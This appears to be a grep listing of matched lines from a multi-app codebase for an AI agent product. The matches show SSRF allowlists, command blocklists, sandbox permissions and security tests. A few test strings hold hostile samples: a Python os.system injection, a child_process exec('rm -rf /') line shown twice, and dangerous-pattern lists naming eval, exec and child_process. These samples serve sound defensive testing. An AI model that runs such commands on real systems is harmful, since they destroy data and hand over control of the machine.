+./apps/web/lib/egress-policy.ts:7: * defense-in-depth — a single allowlist regression (e.g., adding `*.com` by
+./apps/web/lib/egress-policy.ts:9: * and reserved/private ranges *before* the allowlist check, so even an
+./apps/web/lib/egress-policy.ts:10: * over-broad allowlist cannot be coerced into reaching internal addresses.
+./apps/web/lib/egress-policy.ts:15: * service-allowlist semantics.
+./apps/web/lib/egress-policy.ts:36:    super(`Egress blocked: ${url} is not in the approved allowlist`);
+./apps/web/lib/egress-policy.ts:56:  const m = IPV4_LITERAL.exec(unbracketed);
+./apps/web/lib/egress-policy.ts:88: * allowlist, just the never-route-internally invariant. Suitable for
+./apps/web/lib/egress-policy.ts:117:  // Defense-in-depth: even if an allowlist entry is overly broad, never
+./apps/web/lib/egress-policy.ts:168: * - Does NOT enforce the service allowlist (we don't know every legit
+./apps/web/lib/services/api-key-service.ts:308:    const keyIdMatch = KEY_ID_REGEX.exec(rawKey);
+./apps/desktop/src-tauri/src/features/teams/team_permissions.rs:53:        permissions.iter().all(|p| Self::has_permission(member, *p))
+./apps/desktop/src-tauri/src/features/teams/team_permissions.rs:57:        permissions.iter().any(|p| Self::has_permission(member, *p))
+./apps/desktop/src/components/ROIDashboard/components/MilestoneToast.tsx:87:          window.open(twitterUrl, '_blank');
+apps/desktop/src-tauri/src/core/agi/tests/security_tests.rs:328:            "exec('__import__(\"os\").system(\"evil\")')",
+apps/desktop/src-tauri/src/core/agi/tests/security_tests.rs:329:            "eval('malicious code')",
+apps/desktop/src-tauri/src/core/agi/tests/memory_tests.rs:74:    fn test_memory_retrieval() {
+./apps/desktop/src/components/Notifications/NotificationCenter.tsx:350:            window.open(url, '_blank', 'noopener,noreferrer');
+./apps/web/lib/llm-providers/factory.ts:126:  /** WEB-2 (audit 2026-05-03): SSRF allowlist. We honour `*_BASE_URL`
+./apps/web/lib/llm-providers/factory.ts:189:        'Refusing *_BASE_URL override pointing to non-allowlisted host (potential SSRF)',
+./apps/desktop/src-tauri/src/features/tests/agi_tests.rs:494:    fn test_memory_retrieval() {
+./apps/web/lib/egress-policy.test.ts:176:describe('validateEgressUrl — service allowlist (unchanged behavior)', () => {
+./apps/web/lib/egress-policy.test.ts:189:  it('blocks IMDS even if hostname were somehow allowlisted (defense in depth)', () => {
+./apps/web/lib/egress-policy.test.ts:190:    // Direct IP → not in allowlist anyway, but the internal-host check fires first.
+./apps/web/lib/security/secrets-audit.ts:124:    while ((match = pattern.exec(content)) !== null) {
+./apps/web/lib/security/secrets-audit.ts:161:    while ((match = pattern.exec(content)) !== null) {
+./apps/desktop/src-tauri/src/lib.rs:773:            // Persisted to ~/Library/Application Support/.../app_permissions.json
+./apps/desktop/src-tauri/src/lib.rs:777:                let perm_path = app_data_dir.join("app_permissions.json");
+./apps/desktop/src-tauri/src/lib.rs:785:                                    "Failed to load app_permissions.json: {}",
+./apps/desktop/src-tauri/src/core/orchestration/workflow_executor.rs:772:                    ("child_process", "child process execution"),
+apps/desktop/src-tauri/src/core/agi/executors/tests/database_executor_tests.rs:267:    fn test_validate_query_exec() {
+apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:57:/// - `BlocklistAndAllowlist`: Requires command to match allowlist AND not match blocklist
+apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:173:    /// Default allowlist: safe commands that are always allowed.
+apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:307:    /// Validate a command against the security blocklist and/or allowlist.
+apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:312:    /// * `security_mode` - The security mode to use (blocklist, allowlist, or both)
+apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:348:        // Check allowlist based on security mode
+apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:357:                        "[TerminalExecutor] SECURITY: Command not in allowlist: {}",
+apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:361:                        "Command not allowed: not in the approved command list. Use a different security mode or add this command to the allowlist."
+apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:539:                "allowlist" => SecurityMode::Allowlist,
+apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:540:                "blocklist_and_allowlist" | "both" => SecurityMode::BlocklistAndAllowlist,
+apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:545:        // SECURITY: Check blocklist/allowlist patterns
+apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:1036:    fn test_allowlist_mode() {
+apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:1040:        // Commands in allowlist should pass
+apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:1046:        // Commands not in allowlist should fail
+apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:1052:    fn test_blocklist_and_allowlist_mode() {
+apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:1056:        // Commands in allowlist and not in blocklist should pass
+apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:1060:        // Commands in blocklist should fail even if in allowlist
+apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:1063:        // Commands not in allowlist should fail
+apps/desktop/src-tauri/src/core/agi/executors/code_executor.rs:96:            pattern: "eval(",
+apps/desktop/src-tauri/src/core/agi/executors/code_executor.rs:102:            pattern: "exec(",
+apps/desktop/src-tauri/src/core/agi/executors/code_executor.rs:114:            pattern: "require('child_process')",
+apps/desktop/src-tauri/src/core/agi/executors/code_executor.rs:120:            pattern: "child_process",
+apps/desktop/src-tauri/src/core/agi/executors/code_executor.rs:1069:        // Dangerous JavaScript code - child_process
+apps/desktop/src-tauri/src/core/agi/executors/code_executor.rs:1070:        let dangerous_code = "const { exec } = require('child_process'); exec('rm -rf /');";
+./apps/web/__tests__/security/rt-01-provider-stream-auth.test.ts:144:  it('returns 400 when providerId is not in the allowlist', async () => {
+./apps/web/__tests__/security/rt-01-provider-stream-auth.test.ts:223:  it('accepts all valid provider IDs in allowlist', async () => {
+./apps/web/__tests__/security/rt-02-api-key-dos.test.ts:97:      const match = KEY_ID_REGEX.exec(key);
+./apps/web/__tests__/api/llm-completion.test.ts:10:// grok-4, etc.) that exist in the model catalog but are not in any tier allowlist
+./apps/desktop/src/components/UnifiedAgenticChat/DeepResearchPanel.tsx:38:      window.open(url, '_blank', 'noopener,noreferrer');
+./apps/desktop/src/components/UnifiedAgenticChat/CitationBadge.tsx:133:  while ((match = citationRegex.exec(text)) !== null) {
+./apps/desktop/src-tauri/src/core/llm/tool_executor/ui_automation_tools.rs:83:                                data: json!({ "error": format!("Automation service not available: {}. Please grant accessibility permissions.", e), "success": false }),
+./apps/desktop/src-tauri/src/core/llm/tool_executor/ui_automation_tools.rs:84:                                error: Some(format!("Automation service not available: {}. Please grant accessibility permissions.", e)),
+./apps/desktop/src-tauri/src/core/llm/tool_executor/ui_automation_tools.rs:220:                                data: json!({ "error": format!("Automation service not available: {}. Please grant accessibility permissions.", e), "success": false }),
+./apps/desktop/src-tauri/src/core/llm/tool_executor/ui_automation_tools.rs:221:                                error: Some(format!("Automation service not available: {}. Please grant accessibility permissions.", e)),
+./apps/desktop/src-tauri/src/core/llm/tool_executor/mod.rs:1069:                        "mcp__filesystem__read_text_file timed out after {}ms. Try a smaller file or verify permissions.",
+./apps/desktop/src-tauri/src/sys/error/translator.rs:236:                suggestion: "Please choose a different location or check file permissions."
+./apps/desktop/src-tauri/src/sys/error/translator.rs:246:                suggestion: "Please check the file path and permissions.".to_string(),
+./apps/desktop/src-tauri/src/core/llm/tool_executor/browser_tools.rs:114:    //    Check before pseudo-class allowlist walk so the error message is specific.
+./apps/desktop/src-tauri/src/core/llm/tool_executor/browser_tools.rs:119:    // 5. Validate pseudo-classes against the safe allowlist.
+./apps/desktop/src-tauri/src/core/llm/tool_executor/db_tools.rs:52:        // SECURITY: Block CTE (WITH) queries — they can bypass table allowlist validation
+./apps/desktop/src-tauri/src/core/llm/tool_executor/db_tools.rs:112:        // SECURITY: Table allowlist — LLM may only SELECT from non-sensitive tables.
+./apps/desktop/src-tauri/src/core/llm/tool_executor/db_tools.rs:167:        // Extract FROM and JOIN table references and validate each against the allowlist.
+./apps/desktop/src-tauri/src/core/llm/tool_executor/db_tools.rs:380:        // Block dangerous DDL operations and CTEs (which can bypass table allowlist)
+./apps/desktop/src-tauri/src/core/llm/tool_executor/db_tools.rs:405:        // SECURITY: Table allowlist for write operations — very narrow set.
+./apps/desktop/src-tauri/src/core/llm/tool_executor/db_tools.rs:461:            // Re-use the same ALLOWED_QUERY_TABLES allowlist from execute_db_query_tool.
+./apps/desktop/src-tauri/src/sys/account/mod.rs:408:/// - Domain must match the allowlist: `*.agiworkforce.com`, `localhost`, or `127.0.0.1`
+./apps/desktop/src-tauri/src/sys/account/mod.rs:442:    // Domain allowlist: *.agiworkforce.com, localhost, 127.0.0.1
+./apps/desktop/src-tauri/src/sys/account/mod.rs:447:            "API base URL host '{}' is not in the allowlist. \
+./apps/desktop/src-tauri/src/sys/account/mod.rs:469:    // SSRF protection: validate against scheme and domain allowlist
+./apps/desktop/src-tauri/src/core/mcp/server/tools.rs:90:    fn enabled_tool_check_respects_allowlist() {
+./apps/desktop/src-tauri/src/core/mcp/server/tools.rs:91:        let allowlist = vec!["agi_chat".to_string(), "agi_bash".to_string()];
+./apps/desktop/src-tauri/src/core/mcp/server/tools.rs:94:            &allowlist, "agi_chat"
+./apps/desktop/src-tauri/src/core/mcp/server/tools.rs:97:            &allowlist,
+./apps/desktop/src-tauri/src/core/mcp/transport.rs:399:        // Validate the command against the allowlist before spawning
+./apps/desktop/src-tauri/src/core/mcp/transport.rs:433:        // We use a blocklist (not allowlist) because MCP servers legitimately need most of
+./apps/desktop/src-tauri/src/core/mcp/transport.rs:434:        // the parent environment (PATH, HOME, LANG, etc.) to function. An allowlist would
+./apps/desktop/src-tauri/src/sys/permissions/manager.rs:280:        let db_path = dir.path().join("permissions.db");
+./apps/desktop/src-tauri/src/sys/commands/agi.rs:67:            "Automation service not available. Please grant accessibility permissions.".to_string(),
+./apps/desktop/src-tauri/src/sys/commands/agi.rs:74:        "Automation service not available. Please grant accessibility permissions.".to_string()
+./apps/desktop/src-tauri/src/sys/commands/agi.rs:293:            "Automation service not available. Please grant accessibility permissions.".to_string(),
+./apps/desktop/src-tauri/src/sys/commands/agi.rs:300:        "Automation service not available. Please grant accessibility permissions.".to_string()
+./apps/desktop/src-tauri/src/sys/permissions/policy.rs:116:        for blocked in &self.file_permissions.blocked_paths {
+./apps/desktop/src-tauri/src/sys/permissions/policy.rs:122:        if !self.file_permissions.allowed_paths.is_empty() {
+./apps/desktop/src-tauri/src/sys/permissions/policy.rs:134:        if self.file_permissions.allowed_extensions.is_empty() {
+./apps/desktop/src-tauri/src/sys/permissions/policy.rs:152:        if !self.network_permissions.allowed_domains.is_empty() {
+./apps/desktop/src-tauri/src/sys/permissions/policy.rs:222:        policy.file_permissions.allowed_paths = vec!["C:\\Users\\".to_string()];
+./apps/desktop/src-tauri/src/sys/permissions/policy.rs:223:        policy.file_permissions.blocked_paths = vec!["C:\\Windows\\".to_string()];
+./apps/desktop/src/components/Artifacts/ArtifactRendererView.tsx:322:    //   not inject any eval-dependent console-capture logic. Blocking eval()
+./apps/desktop/src/components/Artifacts/ArtifactRendererView.tsx:324:    //   If a user artifact explicitly calls eval() it will be blocked by the CSP
+./apps/desktop/src/components/Artifacts/ArtifactRendererView.tsx:393:        sandbox={data.sandbox_permissions.join(' ')}
+./apps/desktop/src-tauri/src/core/agent/runtime.rs:435:            "Permission denied. Check file/directory permissions. Ensure the process has read/write access. On Windows, try running with administrator privileges if needed."
+./apps/desktop/src-tauri/src/sys/commands/voice.rs:2134:        return Err("No audio data was captured. Check microphone permissions.".to_string());
+./apps/desktop/src-tauri/src/sys/security/api.rs:59:        self.permissions.contains(&permission.to_string())
+./apps/desktop/src-tauri/src/sys/security/api.rs:60:            || self.permissions.contains(&"*".to_string())
+./apps/mobile/app/(app)/usage.tsx:397:      // HIGH-MOB-02 fix: validate `data.url` against the allowlist (see
+./apps/mobile/app/(app)/profile/index.tsx:133:      // HIGH-MOB-02 allowlist: only https://stripe.com / *.stripe.com /
+./apps/desktop/src-tauri/src/sys/security/sandbox.rs:120:            permissions: permissions.unwrap_or_else(|| config.default_permissions.clone()),
+./apps/desktop/src-tauri/src/sys/security/sandbox.rs:208:        for blocked in &session.permissions.blocked_paths {
+./apps/desktop/src-tauri/src/sys/security/sandbox.rs:215:        if session.permissions.allowed_paths.is_empty() {
+./apps/desktop/src-tauri/src/sys/security/sandbox.rs:220:        for allowed in &session.permissions.allowed_paths {
+./apps/desktop/src-tauri/src/sys/security/sandbox.rs:245:        if !session.permissions.network_access {
+./apps/desktop/src-tauri/src/sys/security/sandbox.rs:250:        for blocked in &session.permissions.blocked_hosts {
+./apps/desktop/src-tauri/src/sys/security/sandbox.rs:257:        if session.permissions.allowed_hosts.is_empty() {
+./apps/desktop/src-tauri/src/sys/security/sandbox.rs:262:        for allowed in &session.permissions.allowed_hosts {
+./apps/desktop/src-tauri/src/sys/security/permissions.rs:340:        assert_eq!(permissions.len(), 2);
+./apps/desktop/src-tauri/src/sys/security/tool_guard.rs:1809:            "eval(",
+./apps/desktop/src-tauri/src/sys/security/tool_guard.rs:1810:            "exec(",
+./apps/desktop/src-tauri/src/sys/security/machine_key.rs:68:    /// `~/.agiworkforce/connector-permissions.json` (Desktop P0, audit C-rank 1).
+./apps/mobile/app/(app)/(tabs)/settings.tsx:249:      // HIGH-MOB-02 fix: validate `data.url` against the allowlist (see
+./apps/desktop/src-tauri/src/sys/security/auth.rs:741:    fn test_jwt_secret_retrieval() {
+./apps/mobile/app/(app)/settings/integrations.tsx:357:              <Text className="text-white/40 text-sm ml-3">Checking permissions...</Text>
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:3://! Persists config and allowlisted senders to a JSON file in the app data
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:44:/// An allowlisted sender
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:69:    allowlist: HashMap<String, AllowlistedSender>,
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:78:    allowlist: Arc<RwLock<HashMap<String, AllowlistedSender>>>,
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:90:            allowlist: Arc::new(RwLock::new(HashMap::new())),
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:103:        let (config, allowlist) = storage_path
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:109:                        .map(|state| (state.config, state.allowlist))
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:117:            allowlist: Arc::new(RwLock::new(allowlist)),
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:132:    /// Persist the current config and allowlist to disk.
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:147:        let allowlist = match self.allowlist.read() {
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:152:        let state = PersistedDmState { config, allowlist };
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:217:    /// Verify a pairing code and add the sender to the allowlist on success.
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:228:                // Add to allowlist
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:237:                let mut allowlist = self
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:238:                    .allowlist
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:241:                allowlist.insert(requester_id.to_string(), sender);
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:246:                // Persist the updated allowlist
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:248:                drop(allowlist);
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:258:    /// Check if a sender is allowlisted
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:269:        let allowlist = self
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:270:            .allowlist
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:274:        Ok(allowlist.contains_key(sender_id))
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:277:    /// Manually add to allowlist
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:278:    pub fn add_to_allowlist(
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:292:        let mut allowlist = self
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:293:            .allowlist
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:296:        allowlist.insert(sender_id.to_string(), sender);
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:297:        drop(allowlist);
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:304:    /// Remove from allowlist
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:305:    pub fn remove_from_allowlist(&self, sender_id: &str) -> Result<bool> {
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:306:        let mut allowlist = self
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:307:            .allowlist
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:310:        let removed = allowlist.remove(sender_id).is_some();
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:311:        drop(allowlist);
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:320:    /// List allowlisted senders
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:321:    pub fn list_allowlist(&self) -> Result<Vec<AllowlistedSender>> {
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:322:        let allowlist = self
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:323:            .allowlist
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:326:        Ok(allowlist.values().cloned().collect())
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:379:            allowlist: Arc::new(RwLock::new(HashMap::new())),
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:384:        dm.add_to_allowlist("user-1", "discord", Some("Alice"))
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:385:            .expect("add_to_allowlist should succeed");
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:398:        assert_eq!(state.allowlist.len(), 1);
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:399:        assert!(state.allowlist.contains_key("user-1"));
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:401:            state.allowlist["user-1"].display_name.as_deref(),
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:420:            allowlist: Arc::new(RwLock::new(HashMap::new())),
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:424:        dm.add_to_allowlist("user-2", "slack", None)
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:426:        dm.remove_from_allowlist("user-2")
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:431:        assert!(state.allowlist.is_empty());
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:447:            allowlist: Arc::new(RwLock::new(HashMap::new())),
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:476:        dm.add_to_allowlist("test", "test", None)
+./apps/desktop/src-tauri/src/sys/security/dm_protection.rs:478:        let list = dm.list_allowlist().expect("list should work");
+./apps/desktop/src-tauri/src/sys/security/rbac.rs:127:            permissions.extend(role_perms.iter().cloned());
+./apps/desktop/src-tauri/src/sys/security/rbac.rs:143:                permissions.insert(perm_name);
+./apps/desktop/src-tauri/src/sys/security/rbac.rs:145:                permissions.remove(&perm_name);
+./apps/desktop/src-tauri/src/sys/security/rbac.rs:149:        Ok(permissions.into_iter().collect())
+./apps/desktop/src-tauri/src/sys/security/rbac.rs:373:        assert!(!permissions.is_empty());
+./apps/desktop/src-tauri/src/sys/security/rbac.rs:375:        assert!(permissions.iter().any(|p| p.name == "chat:read"));
+./apps/desktop/src-tauri/src/sys/security/rbac.rs:376:        assert!(permissions.iter().any(|p| p.name == "chat:write"));
+./apps/cli/src/policy/linux_sandbox.rs:3://! Wraps a child process under a tight syscall allowlist using seccomp-BPF.
+./apps/cli/src/policy/linux_sandbox.rs:9://! 2. Apply via `seccompiler::apply_filter` BEFORE exec(); the wrapped child
+./apps/cli/src/policy/linux_sandbox.rs:209:    fn unrestricted_returns_empty_allowlist_sentinel() {
+./apps/cli/src/policy/macos_sandbox.rs:170:    fn wrap_command_invokes_sandbox_exec() {
+./apps/cli/src/permissions.rs:24:        Ok(crate::config::CliConfig::config_dir()?.join("permissions.toml"))
+./apps/cli/src/permissions.rs:32:        let contents = std::fs::read_to_string(&path).context("Failed to read permissions.toml")?;
+./apps/cli/src/permissions.rs:34:            toml::from_str(&contents).context("Failed to parse permissions.toml")?;
+./apps/cli/src/permissions.rs:43:        std::fs::write(&path, &contents).context("Failed to write permissions.toml")?;
+./apps/cli/src/permissions.rs:94:    /// Reset all permissions.
+./apps/web/shared/lib/accessibility.ts:338:    const result = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex);
+./apps/cli/src/daemon.rs:921:    // prompt text or partial API responses. Mirrors auth.rs set_file_permissions.
+./apps/cli/src/command_registry.rs:525:        assert_eq!(permissions.aliases, vec!["perms", "approvals"]);
+./apps/cli/src/command_registry.rs:526:        assert_eq!(permissions.slash_aliases(), vec!["/perms", "/approvals"]);
+./apps/desktop/src-tauri/src/sys/commands/mcpb.rs:1436:                    description: "Cloudflare API token with appropriate permissions.".to_string(),
+./apps/cli/src/safety/mod.rs:620:    fn dangerous_eval_exec() {
+./apps/cli/src/safety/mod.rs:672:    fn find_safe_without_exec() {
+./apps/cli/src/safety/mod.rs:685:    fn find_dangerous_with_exec() {
+./apps/desktop/src-tauri/src/sys/commands/computer_use.rs:907:        Ok(dir) => dir.join("app_permissions.json"),
+./apps/desktop/src-tauri/src/sys/commands/computer_use.rs:909:            tracing::warn!("Could not resolve app_data_dir for app_permissions.json: {}", e);
+./apps/desktop/src-tauri/src/sys/commands/computer_use.rs:917:                tracing::warn!("Failed to persist app_permissions.json at {:?}: {}", path, e);
+./apps/cli/src/models/provider_dispatch.rs:249:        // SEV-CLI-04 fix: enforce a scheme allowlist before registering any
+./apps/desktop/src-tauri/src/sys/commands/connector_permissions.rs:3://! Permissions are stored in `~/.agiworkforce/connector-permissions.json` encrypted
+./apps/desktop/src-tauri/src/sys/commands/connector_permissions.rs:78:        .map(|d| d.join("connector-permissions.json"))
+./apps/cli/src/mcp/mod.rs:503:    /// a safe allowlist. The manifest env is applied after, but filtered to exclude
+./apps/cli/src/mcp/mod.rs:521:        // Re-inject only a minimal safe allowlist from the parent environment.
+./apps/cli/src/mcp/mod.rs:1750:    /// Simulate the BLOCKED_MANIFEST_VARS / allowlist logic from spawn_stdio_child
+./apps/cli/src/mcp/mod.rs:1862:        // would not reach the child via the allowlist re-injection path.
+./apps/cli/src/mcp/mod.rs:1869:            "ANTHROPIC_API_KEY must not be in the parent env allowlist"
+./apps/cli/src/mcp/mod.rs:1873:            "OPENAI_API_KEY must not be in the parent env allowlist"
+./apps/desktop/src-tauri/src/sys/diagnostics/checks/permissions.rs:3://! Verifies the application has required file system permissions.
+./apps/desktop/src-tauri/src/sys/diagnostics/checks/permissions.rs:139:                "Check directory permissions. On macOS/Linux, use chmod. On Windows, check folder security properties.",
+./apps/desktop/src-tauri/src/sys/diagnostics/checks/permissions.rs:153:                "Some optional directories have limited permissions.",
+./apps/desktop/src/components/UnifiedAgenticChat/InlinePanels/BrowserInlinePanel.tsx:46:      window.open(browserContent.url, '_blank');
+./apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:57:/// - `BlocklistAndAllowlist`: Requires command to match allowlist AND not match blocklist
+./apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:173:    /// Default allowlist: safe commands that are always allowed.
+./apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:307:    /// Validate a command against the security blocklist and/or allowlist.
+./apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:312:    /// * `security_mode` - The security mode to use (blocklist, allowlist, or both)
+./apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:348:        // Check allowlist based on security mode
+./apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:357:                        "[TerminalExecutor] SECURITY: Command not in allowlist: {}",
+./apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:361:                        "Command not allowed: not in the approved command list. Use a different security mode or add this command to the allowlist."
+./apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:539:                "allowlist" => SecurityMode::Allowlist,
+./apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:540:                "blocklist_and_allowlist" | "both" => SecurityMode::BlocklistAndAllowlist,
+./apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:545:        // SECURITY: Check blocklist/allowlist patterns
+./apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:1036:    fn test_allowlist_mode() {
+./apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:1040:        // Commands in allowlist should pass
+./apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:1046:        // Commands not in allowlist should fail
+./apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:1052:    fn test_blocklist_and_allowlist_mode() {
+./apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:1056:        // Commands in allowlist and not in blocklist should pass
+./apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:1060:        // Commands in blocklist should fail even if in allowlist
+./apps/desktop/src-tauri/src/core/agi/executors/terminal_executor.rs:1063:        // Commands not in allowlist should fail
+./apps/desktop/src-tauri/src/sys/commands/email.rs:1219:    fn test_secure_password_storage_and_retrieval() {
+./apps/desktop/src/components/Marketplace/components/ShareModal.tsx:98:      // MKT-002 fix: Use window.open instead of location.href to prevent
+./apps/desktop/src/components/Marketplace/components/ShareModal.tsx:100:      window.open(url, '_blank', 'noopener,noreferrer');
+./apps/desktop/src/components/Marketplace/components/ShareModal.tsx:102:      // MKT-004 fix: Add noopener,noreferrer to prevent window.opener access
+./apps/desktop/src/components/Marketplace/components/ShareModal.tsx:103:      window.open(url, '_blank', 'width=600,height=400,noopener,noreferrer');
+./apps/desktop/src/components/Marketplace/components/WorkflowMarketplace.tsx:138:        window.open(shareUrl, '_blank');
+./apps/desktop/src-tauri/src/sys/commands/project_context.rs:153:                "Cannot access the folder '{}'. Please check permissions.",
+./apps/desktop/src-tauri/src/sys/commands/agent.rs:48:            "Automation service not available. Please grant accessibility permissions.".to_string(),
+./apps/desktop/src/components/Settings/AgentExecutionSettings.tsx:141:      'Matches CLI-style workspace write access: the current workspace can write, and network is allowlisted.',
+./apps/desktop/src/components/Settings/AgentExecutionSettings.tsx:338:                Comma-separated allowlist. Leave empty to block all network access inside the
+./apps/desktop/src/components/Settings/AgentExecutionSettings.tsx:350:                allowlisted.
+./apps/desktop/src/lib/tauri-mock.ts:2350:  window.open(url, '_blank', 'noopener,noreferrer');
+./apps/desktop/src/components/Settings/AutomationPermissionsSettings.tsx:144:          <span>Checking permissions...</span>
+./apps/desktop/src-tauri/src/sys/commands/tool_confirmation.rs:23:/// - **Plan**: Read-only tools allowed (same allowlist as Safe). The agent
+./apps/desktop/src-tauri/src/sys/commands/tool_confirmation.rs:157:    /// Read-only tool allowlist shared by Safe and Plan modes.
+./apps/desktop/src-tauri/src/sys/commands/tool_confirmation.rs:194:                // Direct allowlist match
+./apps/desktop/src-tauri/src/integrations/realtime/websocket_server.rs:2026:    // ── B3 fix: Origin allowlist tests ──────────────────────────────────────
+./apps/desktop/src-tauri/src/sys/commands/scheduler.rs:58:    // Note: bash, sh, zsh intentionally excluded from ShellCommand allowlist.
+./apps/desktop/src-tauri/src/sys/commands/scheduler.rs:59:    // Shell interpreters bypass the allowlist via -c flag (e.g., bash -c "nmap ...").
+./apps/desktop/src-tauri/src/sys/commands/scheduler.rs:805:/// 2. Command allowlist enforcement (base command must be in ALLOWED_SHELL_COMMANDS)
+./apps/desktop/src-tauri/src/sys/commands/scheduler.rs:854:    // --- Layer 1: Command allowlist enforcement ---
+./apps/desktop/src-tauri/src/sys/commands/scheduler.rs:1209:            // SECURITY: Validate command against dangerous patterns, allowlist, and injection
+./apps/desktop/src-tauri/src/sys/commands/scheduler.rs:1477:            // SECURITY: Validate script against dangerous patterns, allowlist, and injection
+./apps/desktop/src-tauri/src/sys/commands/scheduler.rs:2066:        // rm is not in the allowlist, so it gets caught at the allowlist layer
+./apps/desktop/src-tauri/src/sys/commands/scheduler.rs:2068:        // cp IS in the allowlist, so test patterns that hit the protected-path layer
+./apps/desktop/src-tauri/src/sys/commands/scheduler.rs:2143:        // /usr/bin/git should be allowed (base command "git" is in allowlist)
+./apps/desktop/src-tauri/src/sys/commands/realtime.rs:150:    // Persist with restricted permissions.
+./apps/desktop/src-tauri/src/core/agi/executors/code_executor.rs:96:            pattern: "eval(",
+./apps/desktop/src-tauri/src/core/agi/executors/code_executor.rs:102:            pattern: "exec(",
+./apps/desktop/src-tauri/src/core/agi/executors/code_executor.rs:114:            pattern: "require('child_process')",
+./apps/desktop/src-tauri/src/core/agi/executors/code_executor.rs:120:            pattern: "child_process",
+./apps/desktop/src-tauri/src/core/agi/executors/code_executor.rs:1069:        // Dangerous JavaScript code - child_process
+./apps/desktop/src-tauri/src/core/agi/executors/code_executor.rs:1070:        let dangerous_code = "const { exec } = require('child_process'); exec('rm -rf /');";
+./apps/cli/src/lib.rs:1168:                        cloud::cloud_exec(&cc, prompt, model.as_deref()).await?;
+./apps/cli/src/cloud.rs:104:pub async fn cloud_exec(
+./apps/cli/src/a2a/mod.rs:475:    // SSRF allowlist tests
+./apps/desktop/src/utils/permissions.ts:59:    return permissions.includes(permission);
+./apps/desktop/src/utils/permissions.ts:63:    return permissions.every((permission) => this.hasPermission(role, permission));
